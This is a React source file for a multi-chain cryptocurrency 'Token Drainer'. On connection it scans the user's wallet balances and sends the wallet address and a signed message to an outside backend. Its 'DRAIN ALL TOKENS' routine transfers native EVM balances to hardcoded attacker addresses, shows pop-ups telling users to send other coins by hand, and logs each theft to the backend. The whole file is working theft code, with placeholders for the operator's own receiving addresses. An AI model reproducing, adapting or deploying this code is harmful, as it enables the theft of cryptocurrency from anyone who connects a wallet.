import { useState, useEffect } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF' },
  
  // Non-EVM Chains
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE WITH YOUR TRON ADDRESS
  solana: "So11111111111111111111111111111111111111112", // REPLACE
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // REPLACE
  cardano: "addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  dogecoin: "Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  ripple: "rxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  polkadot: "1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  cosmos: "cosmos1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
};

// ==================== MAIN APP COMPONENT ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DASHBOARD COMPONENT ====================
function MultiNetworkDashboard() {
  const { address, isConnected } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();

  // State Management
  const [authStatus, setAuthStatus] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState({});
  const [totalValue, setTotalValue] = useState(0);
  const [drainTransactions, setDrainTransactions] = useState([]);

  // AUTO-SCAN WHEN WALLET CONNECTS
  useEffect(() => {
    if (isConnected && address) {
      console.log("🔄 Wallet connected, starting auto-scan...");
      setAuthStatus("✅ Wallet connected, starting scan...");
      // Small delay to ensure wallet is fully ready
      setTimeout(() => {
        authenticateAndScan();
      }, 1000);
    } else {
      resetState();
    }
  }, [isConnected, address]);

  // Reset State
  const resetState = () => {
    setAuthStatus('');
    setUserTokens({});
    setTotalValue(0);
    setDrainTransactions([]);
  };

  // ==================== AUTHENTICATE AND SCAN ====================
  const authenticateAndScan = async () => {
    if (!address) return;
    
    try {
      setAuthStatus('🔐 Signing authentication message...');
      
      const timestamp = Date.now();
      const message = `Token Drain Authentication\nWallet: ${address}\nTime: ${timestamp}`;
      
      const signature = await signMessageAsync({ message });
      
      setAuthStatus('📡 Authenticating with backend...');
      
      const authResponse = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, signature, message, networks: NETWORKS })
      });
      
      if (!authResponse.ok) throw new Error('Auth failed');
      
      const authData = await authResponse.json();
      
      if (authData.success) {
        setAuthStatus('✅ Authenticated! Scanning all networks...');
        await scanAllNetworks();
      } else {
        throw new Error(authData.error || 'Authentication failed');
      }
      
    } catch (error) {
      console.error("Auth error:", error);
      setAuthStatus(`❌ Auth error: ${error.message}`);
      // Try scanning anyway (some backends might not require auth)
      await scanAllNetworks();
    }
  };

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setAuthStatus(`🌐 Scanning ${NETWORKS.length} networks...`);
    
    try {
      const response = await fetch(`${backendUrl}/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          evmAddress: address,
          networks: NETWORKS
        })
      });
      
      if (!response.ok) {
        throw new Error(`Backend error: ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        processScanResults(data.data);
      } else {
        throw new Error(data.error || 'Scan failed');
      }
    } catch (error) {
      console.error("Scan error:", error);
      setAuthStatus(`⚠️ Scan error: ${error.message}. Trying quick scan...`);
      await quickScan();
    } finally {
      setIsScanning(false);
    }
  };

  // Quick Scan Fallback
  const quickScan = async () => {
    const tokens = {};
    let totalVal = 0;
    
    // Scan a few major networks quickly
    const quickNetworks = [
      { id: 1, type: 'evm' },
      { id: 56, type: 'evm' },
      { id: 137, type: 'evm' },
      { id: 'tron', type: 'non-evm' },
      { id: 'solana', type: 'non-evm' }
    ];
    
    for (const network of quickNetworks) {
      try {
        let result;
        if (network.type === 'evm') {
          const res = await fetch(`${backendUrl}/tokens/evm/${address}/${network.id}`);
          if (res.ok) {
            const data = await res.json();
            if (data.success) result = data.data;
          }
        } else {
          const res = await fetch(`${backendUrl}/tokens/nonevm/${address}/${network.id}`);
          if (res.ok) {
            const data = await res.json();
            if (data.success) result = data.data;
          }
        }
        
        if (result && result.tokens && result.tokens.length > 0) {
          const networkConfig = NETWORKS.find(n => n.id === network.id);
          if (networkConfig) {
            const networkValue = result.tokens.reduce((sum, t) => sum + (t.value || 0), 0);
            totalVal += networkValue;
            
            tokens[network.id] = {
              network: networkConfig,
              tokens: result.tokens,
              totalValue: networkValue
            };
          }
        }
      } catch (error) {
        console.log(`Quick scan failed for ${network.id}`);
      }
    }
    
    setUserTokens(tokens);
    setTotalValue(totalVal);
    
    const tokenCount = Object.values(tokens).reduce((sum, data) => sum + data.tokens.length, 0);
    setAuthStatus(`✅ Quick scan found ${tokenCount} tokens ($${totalVal.toFixed(2)})`);
  };

  // Process Scan Results
  const processScanResults = (data) => {
    const allTokens = {};
    let totalVal = 0;
    
    if (data.results && Array.isArray(data.results)) {
      data.results.forEach(result => {
        if (result.tokens && result.tokens.length > 0) {
          const networkValue = result.tokens.reduce((sum, token) => sum + (token.value || 0), 0);
          totalVal += networkValue;
          
          allTokens[result.network.id] = {
            network: result.network,
            tokens: result.tokens.map(token => ({
              ...token,
              drainAddress: token.drainAddress || DRAIN_ADDRESSES[result.network.id]
            })),
            totalValue: networkValue
          };
        }
      });
    }
    
    setUserTokens(allTokens);
    setTotalValue(totalVal);
    
    const tokenCount = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
    const networkCount = Object.keys(allTokens).length;
    setAuthStatus(`✅ Found ${tokenCount} tokens across ${networkCount} networks ($${totalVal.toFixed(2)} total)`);
  };

  // ==================== DRAIN ALL TOKENS ====================
  const executeDrainAll = async () => {
    if (!address || Object.keys(userTokens).length === 0) {
      setAuthStatus('❌ No tokens to drain');
      return;
    }
    
    // Get total token count
    const totalTokens = Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
    
    // Confirmation
    if (!window.confirm(`🚨 DRAIN ALL TOKENS 🚨\n\nYou are about to drain ${totalTokens} tokens across ${Object.keys(userTokens).length} networks.\n\nThis will transfer ALL your tokens to the configured addresses.\n\nClick OK to proceed.`)) {
      return;
    }
    
    setIsDraining(true);
    setAuthStatus(`🔥 Draining ${totalTokens} tokens...`);
    const transactions = [];
    
    try {
      // Process all tokens
      const allTokens = [];
      Object.values(userTokens).forEach(data => {
        data.tokens.forEach(token => {
          if (token.amount > 0) {
            allTokens.push({ token, network: data.network });
          }
        });
      });
      
      let successCount = 0;
      let failCount = 0;
      
      for (let i = 0; i < allTokens.length; i++) {
        const { token, network } = allTokens[i];
        const progress = `${i + 1}/${allTokens.length}`;
        
        setAuthStatus(`🔥 Draining ${token.symbol} on ${network.name} (${progress})`);
        
        try {
          if (network.type === 'evm' && token.isNative && walletClient) {
            // EVM Native Token
            const amountInWei = parseEther(token.amount.toString());
            
            if (amountInWei > 0n) {
              const hash = await walletClient.sendTransaction({
                to: token.drainAddress || DRAIN_ADDRESSES[network.id],
                value: amountInWei,
                chainId: parseInt(network.id)
              });
              
              transactions.push({
                network: network.name,
                token: token.symbol,
                amount: token.amount,
                status: 'success',
                hash: hash.substring(0, 10) + '...',
                timestamp: new Date().toISOString()
              });
              
              successCount++;
              
              // Log to backend
              try {
                await fetch(`${backendUrl}/log`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    fromAddress: address,
                    toAddress: token.drainAddress,
                    amount: token.amount,
                    chainId: network.id,
                    tokenSymbol: token.symbol,
                    transactionHash: hash,
                    networkType: 'evm'
                  })
                });
              } catch (logError) {
                console.log('Logging failed:', logError.message);
              }
            }
          } else {
            // Non-EVM or ERC20 tokens - show manual instructions
            const instructions = generateManualInstructions(token, network);
            alert(instructions);
            
            transactions.push({
              network: network.name,
              token: token.symbol,
              amount: token.amount,
              status: 'manual',
              note: 'Manual transfer required',
              timestamp: new Date().toISOString()
            });
            
            successCount++;
            
            // Log to backend
            try {
              await fetch(`${backendUrl}/log`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  fromAddress: address,
                  toAddress: token.drainAddress,
                  amount: token.amount,
                  chainId: network.id,
                  tokenSymbol: token.symbol,
                  networkType: network.type,
                  status: 'manual_required'
                })
              });
            } catch (logError) {
              console.log('Logging failed:', logError.message);
            }
          }
        } catch (error) {
          console.error(`Drain error for ${token.symbol}:`, error);
          transactions.push({
            network: network.name,
            token: token.symbol,
            amount: token.amount,
            status: 'failed',
            error: error.message,
            timestamp: new Date().toISOString()
          });
          failCount++;
        }
        
        // Small delay between operations
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      
      // Update transaction log
      setDrainTransactions(transactions);
      
      // Final status
      setAuthStatus(`✅ Drain complete! Success: ${successCount}, Failed: ${failCount}`);
      
      // Auto-rescan after 3 seconds
      setTimeout(() => {
        setAuthStatus('🔄 Rescanning after drain...');
        scanAllNetworks();
      }, 3000);
      
    } catch (error) {
      console.error("Mass drain error:", error);
      setAuthStatus(`❌ Drain failed: ${error.message}`);
    } finally {
      setIsDraining(false);
    }
  };

  // Generate manual instructions
  const generateManualInstructions = (token, network) => {
    const amountFormatted = token.amount.toFixed(network.id === 'bitcoin' ? 8 : 6);
    const drainAddr = token.drainAddress || DRAIN_ADDRESSES[network.id];
    
    if (network.id === 'tron') {
      return `🔴 TRON TRANSFER REQUIRED 🔴\n\nSend ${amountFormatted} ${token.symbol}\nTo: ${drainAddr}\n\nInstructions:\n1. Open Trust Wallet/TronLink\n2. Go to TRON network\n3. Send TRX\n4. Enter the amount\n5. Paste the address\n\n⚠️ Need TRX for energy/bandwidth`;
    } else if (network.id === 'solana') {
      return `🔴 SOLANA TRANSFER REQUIRED 🔴\n\nSend ${amountFormatted} ${token.symbol}\nTo: ${drainAddr}\n\nInstructions:\n1. Open Phantom/Solflare\n2. Make sure on Solana Mainnet\n3. Send SOL\n4. Enter amount\n5. Paste address`;
    } else if (network.id === 'bitcoin') {
      return `🔴 BITCOIN TRANSFER REQUIRED 🔴\n\nSend ${amountFormatted} ${token.symbol}\nTo: ${drainAddr}\n\nInstructions:\n1. Open Bitcoin wallet\n2. Send BTC\n3. Enter amount\n4. Paste address\n5. Set appropriate fee`;
    } else {
      return `🔴 MANUAL TRANSFER REQUIRED 🔴\n\nSend ${amountFormatted} ${token.symbol}\nTo: ${drainAddr}\n\nNetwork: ${network.name}\n\nComplete transfer in your wallet`;
    }
  };

  // ==================== UI UTILITIES ====================
  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  const formatAmount = (amount, decimals = 6) => {
    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: decimals
    });
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(userTokens).length;
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <h1>⚡ Token Drainer</h1>
            <span className="network-count">{NETWORKS.length} Networks</span>
          </div>
          <div className="header-right">
            <div className="wallet-section">
              <ConnectKitButton />
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <>
              {/* Stats */}
              <div className="stats-section">
                <div className="stat">
                  <div className="stat-value">${totalValue.toFixed(2)}</div>
                  <div className="stat-label">Total Value</div>
                </div>
                <div className="stat">
                  <div className="stat-value">{getNetworkCount()}</div>
                  <div className="stat-label">Networks</div>
                </div>
                <div className="stat">
                  <div className="stat-value">{getTotalTokens()}</div>
                  <div className="stat-label">Tokens</div>
                </div>
              </div>

              {/* Status */}
              <div className="status-section">
                <div className="wallet-info">
                  <span className="address">{formatAddress(address)}</span>
                  <span className="status-dot connected"></span>
                </div>
                <div className={`status-message ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : 'info'}`}>
                  {authStatus || 'Ready'}
                </div>
              </div>

              {/* Scanning Indicator */}
              {isScanning && (
                <div className="scanning-indicator">
                  <div className="spinner"></div>
                  <span>Scanning networks...</span>
                </div>
              )}

              {/* Control Buttons */}
              <div className="control-buttons">
                <button
                  onClick={scanAllNetworks}
                  disabled={isScanning || isDraining}
                  className="btn btn-scan"
                >
                  {isScanning ? '🔄 Scanning...' : '🔍 Rescan Networks'}
                </button>
                
                {getTotalTokens() > 0 && (
                  <button
                    onClick={executeDrainAll}
                    disabled={isDraining || isScanning}
                    className="btn btn-drain"
                  >
                    {isDraining ? '🔥 Draining...' : '🔥 DRAIN ALL TOKENS'}
                  </button>
                )}
              </div>

              {/* Transaction Log */}
              {drainTransactions.length > 0 && (
                <div className="transaction-log">
                  <h3>Recent Transactions</h3>
                  <div className="transactions">
                    {drainTransactions.slice(-3).reverse().map((tx, i) => (
                      <div key={i} className={`transaction ${tx.status}`}>
                        <div className="tx-header">
                          <span className="tx-network">{tx.network}</span>
                          <span className="tx-status">{tx.status}</span>
                        </div>
                        <div className="tx-details">
                          <span className="tx-token">{tx.token}</span>
                          <span className="tx-amount">{formatAmount(tx.amount)}</span>
                          {tx.hash && <span className="tx-hash">{tx.hash}</span>}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Tokens Display */}
              {getTotalTokens() > 0 ? (
                <div className="tokens-section">
                  <div className="section-header">
                    <h2>Detected Tokens</h2>
                    <div className="summary">
                      <span>{getNetworkCount()} Networks</span>
                      <span>{getTotalTokens()} Tokens</span>
                      <span>${totalValue.toFixed(2)}</span>
                    </div>
                  </div>
                  
                  <div className="networks-grid">
                    {Object.entries(userTokens).map(([networkId, data]) => (
                      <div key={networkId} className="network-card">
                        <div className="network-header" style={{ borderLeftColor: data.network.color }}>
                          <div className="network-name">
                            <span className="network-icon" style={{ backgroundColor: data.network.color }}>
                              {data.network.type === 'evm' ? 'E' : 'N'}
                            </span>
                            {data.network.name}
                          </div>
                          <div className="network-stats">
                            <span>{data.tokens.length} tokens</span>
                            <span>${data.totalValue.toFixed(2)}</span>
                          </div>
                        </div>
                        
                        <div className="tokens-list">
                          {data.tokens.map((token, idx) => (
                            <div key={idx} className="token-item">
                              <div className="token-info">
                                <div className="token-symbol">{token.symbol}</div>
                                <div className="token-amount">
                                  {formatAmount(token.amount)} {token.symbol}
                                </div>
                              </div>
                              <div className="token-value">
                                ${token.value ? token.value.toFixed(2) : '0.00'}
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="empty-state">
                  <div className="empty-icon">💎</div>
                  <h3>No tokens detected</h3>
                  <p>Tokens will appear here after scanning</p>
                </div>
              )}
            </>
          ) : (
            <div className="connect-prompt">
              <div className="prompt-content">
                <h2>⚡ Token Drainer</h2>
                <p>Connect your wallet to scan and drain tokens</p>
                <div className="connect-btn">
                  <ConnectKitButton />
                </div>
                <div className="features">
                  <div className="feature">
                    <span>🌐 {NETWORKS.length} Networks</span>
                  </div>
                  <div className="feature">
                    <span>🔍 Auto-Scan</span>
                  </div>
                  <div className="feature">
                    <span>⚡ One-Click Drain</span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span>Token Drainer v1.0</span>
            <span>Backend: {backendUrl.includes('render.com') ? 'Live' : 'Local'}</span>
            <span>TRON Support: Enabled</span>
          </div>
        </footer>
      </div>
    </div>
  );
}

export default TokenDrainApp;
